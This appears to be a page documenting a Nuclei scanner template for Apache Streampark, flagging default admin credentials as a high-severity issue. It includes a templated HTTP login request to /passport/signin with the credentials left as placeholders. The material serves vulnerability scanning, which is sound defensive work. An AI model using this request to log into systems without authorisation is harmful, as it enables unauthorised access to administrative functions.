# Nuclei Template: Apache Streampark - Default Login
**Template ID:** apache-streampark-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`apache-streampark-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Apache Streampark server enables default admin credentials. An attacker can execute unauthorized operations.

## Steps to reproduce / Exploit Payload
```http
POST /passport/signin HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded;charset=UTF-8

password={{password}}&username={{username}}&loginType=PASSWORD
```

## References
- https://github.com/apache/streampark
